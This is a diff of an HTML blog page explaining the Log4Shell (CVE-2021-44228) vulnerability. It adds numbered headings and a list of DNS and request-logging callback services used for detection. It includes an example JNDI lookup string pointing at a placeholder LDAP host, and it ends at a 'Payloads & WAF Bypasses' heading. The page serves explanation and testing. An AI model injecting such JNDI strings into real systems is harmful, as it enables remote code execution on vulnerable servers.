@@ -180,7 +180,7 @@
                 <h1 class="text-uppercase text-capitalize">CVE-2021-44228 - Log4J Start to End Guide Book</h1>
                 <img src="img/blog/LOG4J.jpg" class="img-fluid" alt="Blog image"/>
                 <div class="blog-excerpt open-sans-font pb-5">
-                    <h2>#Introduction</h2>
+                    <h2>1. Introduction</h2>
                     <p>The Log4J vulnerability is triggered by attackers inserting a JNDI lookup in a header field (likely to be logged) linking to a malicious server. After Log4j logs this string, the server is queried and gives directory information leading to the download and execution of a malicious java data class
                     Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. Affected versions are 2.0 <= Apache log4j <= 2.14.1
                     </p>
@@ -196,7 +196,7 @@
                    </script>
                     </div><br />
                     
-                   <h2>#How to works</h2>
+                   <h2>2. How to works ( Detection )</h2>
                      <p> 
 1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br>
 2. The payload is passed to log4j for logging.<br>
@@ -204,7 +204,16 @@
 4. The ldap server responds with directory information that contains the malicious java class.<br>
 5. Java deserializes or download the malicious java class and execute it.<br>
                     </p>
-               
+                 <h2>3. Simple DNS Log Monitor Services</h2>
+ <p> 
+1. - [canarytokens](https://canarytokens.org/generate)
+2. - [ceye](http://ceye.io/)
+3. - [dnslog](https://log.xn--9tr.com/)
+4. - [requestbin](https://requestbin.net/)
+5. - [burp collaborator](https://portswigger.net/burp/documentation/collaborator)
+6. - [run your own dns servers](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
+                    </p>< br />
+     
 <h2>Payloads & WAF Bypasses</h2>
 <pre><code>
 Want to know the Java version running on the target?
